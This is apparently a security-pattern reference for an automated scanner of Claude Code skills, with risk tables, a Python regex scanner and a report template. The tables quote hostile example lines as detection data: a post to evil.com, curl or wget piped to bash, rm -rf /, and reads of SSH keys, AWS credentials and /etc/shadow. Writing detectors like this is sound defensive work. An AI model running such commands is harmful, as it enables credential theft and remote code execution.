# Security Patterns Reference

> **Disclaimer:** The security patterns documented here are intended solely for educational purposes and automated security scanning of Claude Code skills. They catalog known vulnerability patterns to help identify potential security risks in skill implementations and are not meant to facilitate malicious activities.

Load this file when performing Full Analysis security scan.

---

## High-Risk Patterns (Instant Fail)

### Python

| Pattern | Risk | Example |
|---------|------|---------|
| `eval(` | Code execution | `eval(user_input)` |
| `exec(` | Code execution | `exec(payload)` |
| `__import__(` | Dynamic import | `__import__(module_name)` |
| `compile(.+"exec")` | Code compilation | `compile(code, '', 'exec')` |
| `os.system(` | Shell command | `os.system(cmd)` |
| `subprocess.*shell=True` | Shell injection | `subprocess.run(cmd, shell=True)` |
| `/etc/` access | System config | `open('/etc/passwd')` |
| `~/.ssh/` access | SSH keys | `open('~/.ssh/id_rsa')` |
| `~/.aws/` access | AWS creds | `open('~/.aws/credentials')` |
| `.env` read | Secrets | `open('.env')` |
| `requests.post` to external | Data exfil | `requests.post('https://evil.com', data)` |
| `base64.b64decode` + exec | Obfuscation | `exec(base64.b64decode(x))` |

### Bash

| Pattern | Risk | Example |
|---------|------|---------|
| `rm -rf /` | System destruction | `rm -rf /` |
| `curl\|bash` | Remote execution | `curl evil.com/script \| bash` |
| `wget\|bash` | Remote execution | `wget -O- evil.com \| bash` |
| `eval ` | Shell eval | `eval "$user_input"` |
| `cat /etc/passwd` | Credential access | |
| `cat /etc/shadow` | Password hashes | |
| `cat ~/.ssh/id_*` | SSH keys | |

### JavaScript/TypeScript

| Pattern | Risk | Example |
|---------|------|---------|
| `eval(` | Code execution | `eval(userCode)` |
| `new Function(` | Dynamic code | `new Function(code)()` |
| `child_process.exec` | Shell command | `exec(cmd)` |
| `child_process.spawn.*shell` | Shell injection | |

---

## Medium-Risk Patterns (Warning)

| Pattern | Concern | Mitigation |
|---------|---------|------------|
| `pickle.load` | Arbitrary code via pickle | Use JSON instead |
| `yaml.load` (unsafe) | Code execution | Use `yaml.safe_load` |
| `urllib.urlopen` | SSRF | Validate URL |
| `socket.connect` | Network access | Document purpose |
| `ctypes` | Native code | Review carefully |
| `importlib` | Dynamic imports | Audit import targets |

---

## Legitimate Use Cases

Some patterns may be acceptable with proper context:

### Acceptable eval/exec
```python
# Safe: Limited scope, no user input
exec(compile(ast_node, '', 'exec'), {'__builtins__': {}})
```

### Acceptable Network Access
```python
# Safe: Documented, localhost only
requests.post('http://localhost:8080/api', json=data)
```

### Acceptable File Access
```python
# Safe: Within skill's working directory
with open(f'{baseDir}/data/config.json') as f:
    config = json.load(f)
```

---

## Security Scan Implementation

```python
import re
import os

HIGH_RISK = {
    'python': [
        (r'\beval\s*\(', 'eval() - arbitrary code execution'),
        (r'\bexec\s*\(', 'exec() - arbitrary code execution'),
        (r'__import__\s*\(', 'dynamic import'),
        (r'os\.system\s*\(', 'os.system() - shell command'),
        (r'subprocess.*shell\s*=\s*True', 'shell=True'),
        (r'[\'\"]/etc/', '/etc/ access'),
        (r'[\'\"]~/.ssh/', 'SSH key access'),
        (r'[\'\"]~/.aws/', 'AWS credential access'),
        (r'\.env[\'\"\\s]', '.env file access'),
    ],
    'bash': [
        (r'rm\s+-rf\s+/', 'rm -rf /'),
        (r'curl.*\|\s*bash', 'curl | bash'),
        (r'wget.*\|\s*bash', 'wget | bash'),
        (r'\beval\s+', 'bash eval'),
    ],
    'javascript': [
        (r'\beval\s*\(', 'eval()'),
        (r'new\s+Function\s*\(', 'new Function()'),
        (r'child_process\.exec\s*\(', 'child_process.exec()'),
    ]
}

def scan_file(filepath, content):
    """Scan file for security issues"""
    findings = []
    
    # Detect language
    ext = os.path.splitext(filepath)[1]
    lang_map = {
        '.py': 'python',
        '.sh': 'bash', '.bash': 'bash',
        '.js': 'javascript', '.ts': 'javascript'
    }
    lang = lang_map.get(ext)
    
    if not lang:
        return findings
    
    for pattern, desc in HIGH_RISK.get(lang, []):
        if re.search(pattern, content, re.IGNORECASE):
            findings.append({
                'file': filepath,
                'pattern': desc,
                'severity': 'HIGH'
            })
    
    return findings

def scan_skill(skill_dir):
    """Scan entire skill for security issues"""
    scripts_dir = os.path.join(skill_dir, 'scripts')
    all_findings = []
    
    if not os.path.exists(scripts_dir):
        return True, []
    
    for root, _, files in os.walk(scripts_dir):
        for f in files:
            path = os.path.join(root, f)
            try:
                with open(path, 'r') as fp:
                    content = fp.read()
                findings = scan_file(path, content)
                all_findings.extend(findings)
            except:
                pass
    
    passed = len(all_findings) == 0
    return passed, all_findings
```

---

## Security Report Template

```markdown
### Security Scan Results

**Status**: ✅ PASS / ❌ FAIL
**Files Scanned**: [count]
**Findings**: [count]

| File | Pattern | Severity | Line |
|------|---------|----------|------|
| scripts/main.py | eval() | HIGH | 42 |
| ... | ... | ... | ... |

**Risk Assessment**:
- Critical: Findings that must be fixed
- High: Significant concern
- Medium: Needs review
- Low: Minor issue

**Recommendation**: [block/review/approve]
```
